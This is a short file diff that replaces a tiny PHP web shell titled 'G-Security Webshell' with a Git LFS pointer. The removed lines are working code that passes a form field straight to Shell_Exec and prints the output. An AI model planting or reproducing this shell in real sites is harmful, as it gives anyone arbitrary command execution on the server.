@@ -1,18 +1,3 @@
-<html>
-<head>
-<title>G-Security Webshell</title>
-</head>
-
-<body bgcolor=#000000 text=#ffffff ">
-<form method=POST>
-<br>
-<input type=TEXT name="-cmd" size=64 value="<?=$cmd?>" 
-style="background:#000000;color:#ffffff;">
-<hr>
-<pre>
-<? $cmd = $_REQUEST["-cmd"];?>
-<? if($cmd != "") print Shell_Exec($cmd);?>
-</pre>
-</form>
-</body>
-</html
+version https://git-lfs.github.com/spec/v1
+oid sha256:1927b19ccfadbc31b0889958ca5bb8bae178a006c8b47e8e708eb5ecb6819931
+size 335
